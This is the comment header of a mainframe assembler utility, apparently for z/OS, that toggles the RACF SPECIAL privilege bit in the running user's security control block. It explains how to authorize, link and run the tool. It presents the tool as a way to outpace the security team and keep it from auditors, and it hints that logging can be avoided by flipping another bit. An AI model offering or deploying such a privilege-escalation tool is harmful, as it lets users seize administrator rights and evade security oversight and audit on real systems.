* This is one of those 'back-pocket' tools the systems programmer
* can use under certain circumstances. It is particularly useful
* in a disaster recovery test, but can also be useful when testing
* timelines are shorter than the security team's response time.

* You probably won't want your auditor to see this one . . .

* AMISPECL flips the RACF SPECIAL authorization bit in the ACEE
*          Call it again to flip it back.

* INSTRUCTIONS
*
* If you do not plan to add this program to the authorized command
* list in IKJTSOxx then change the @AUTH macros to use whatever
* local method you use to flip the JSCBAUTH bit so the program can
* be authorized to use MODESET.
*
* Assemble and link the code. If it will be in the IKJTSOxx member,
* then link it authorized and place it into an authorized linklist
* dataset. Otherwise, it can be in any load library available from
* TSO.
*
* The program can be called or run as a command processor, since
* it does not use any parameters.
*
* If is displays "No, you are just an ordinary user." then you did
* have the RACF SPECIAL bit set, but do not any more. If it displays
* "Yes, you are very special." then the bit was not set, but is now.
*
* As far as I have been able to determine, the effect of this program
* is temporary. The ACEE bits do not seem to be written back into the
* RACF database. However, it would be wise to switch back to your
* normal mode when you have completed whatever task you needed done.
*
* Note: Having the SPECIAL bit set does not necessarily mean that
* your activities will not be logged. That's another bit. I assume
* no liability for what you do with this code.
